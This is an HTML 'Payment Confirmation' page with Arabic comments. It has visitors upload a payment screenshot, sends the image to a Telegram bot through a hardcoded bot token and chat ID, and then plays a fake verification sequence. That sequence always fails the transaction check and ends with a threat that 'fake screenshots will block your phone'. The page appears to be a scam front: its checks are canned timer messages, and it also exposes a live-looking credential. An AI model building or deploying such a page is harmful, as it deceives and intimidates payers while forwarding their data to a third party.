<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Payment Confirmation</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .glow {
      box-shadow: 0 0 20px rgba(59,130,246,0.35), inset 0 0 10px rgba(59,130,246,0.15);
    }
    .loader {
      border: 4px solid rgba(255,255,255,0.1);
      border-left-color: #3b82f6;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .fade-in {
      opacity: 0;
      animation: fadeIn 0.5s forwards;
    }
    @keyframes fadeIn {
      to { opacity: 1; }
    }
  </style>
</head>
<body class="bg-gray-900 text-white min-h-screen flex items-center justify-center p-6">
  <main class="w-[340px] sm:w-[380px] bg-gray-800 rounded-2xl p-6 shadow-[0_0_30px_rgba(0,0,0,0.35)]">

    <!-- عنوان -->
    <section class="text-center mb-6">
      <h1 class="text-lg font-bold tracking-wide">Payment Confirmation</h1>
      <p class="text-gray-400 text-sm mt-1">Upload payment screenshot for verification</p>
    </section>

    <!-- رفع صورة -->
    <section class="mb-6">
      <label class="block text-sm text-gray-400 mb-1">Screenshot</label>
      <input type="file" id="screenshot" accept="image/*" class="w-full text-sm text-gray-300 bg-gray-900 border border-gray-700 rounded-xl px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" />
    </section>

    <!-- زر الدفع -->
    <section>
      <button id="confirmBtn" class="w-full rounded-xl py-3.5 bg-green-600 hover:bg-green-700 font-bold tracking-wide shadow-md glow">
        PAYMENT DONE
      </button>
    </section>

    <!-- اللودر والرسائل -->
    <section id="statusSection" class="hidden mt-6 text-center">
      <div class="flex justify-center mb-4">
        <div class="loader" id="loader"></div>
      </div>
      <div id="statusMessages" class="space-y-2 text-sm text-gray-300"></div>
    </section>

  </main>

  <script>
    const BOT_TOKEN = "8447607145:AAEWZpX2CUURrXahC_ZWrpnAsOffYiL9zfY"; // توكن البوت
    const CHAT_ID = "8066634898"; // معرف الشات

    document.getElementById("confirmBtn").addEventListener("click", async () => {
      const fileInput = document.getElementById("screenshot");
      if (!fileInput.files.length) {
        alert("Please upload a screenshot first.");
        return;
      }

      // رفع الصورة إلى تيليجرام
      let formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", fileInput.files[0]);
      formData.append("caption", "📸 Payment Screenshot Uploaded");

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      } catch (error) {
        alert("Failed to send screenshot to Telegram.");
        return;
      }

      // عرض اللودر والرسائل
      document.getElementById("statusSection").classList.remove("hidden");
      const messages = [
        { text: "Address wallet checking", result: "✅️" },
        { text: "Network checking", result: "✅️" },
        { text: "Txid payment screenshot checking", result: "❌️" }
      ];

      let container = document.getElementById("statusMessages");
      container.innerHTML = "";
      let i = 0;

      function showNextMessage() {
        if (i < messages.length) {
          let msg = document.createElement("p");
          msg.classList.add("fade-in");
          msg.textContent = `${messages[i].text} ...`;
          container.appendChild(msg);

          setTimeout(() => {
            msg.textContent = `${messages[i].text} Done ${messages[i].result}`;
            i++;
            setTimeout(showNextMessage, 2000);
          }, 2000);
        } else {
          document.getElementById("loader").style.display = "none";
          setTimeout(() => {
            alert("⚠️ Send fake screenshots will block your phone from our software system");
          }, 1000);
        }
      }

      showNextMessage();
    });
  </script>
</body>
</html>
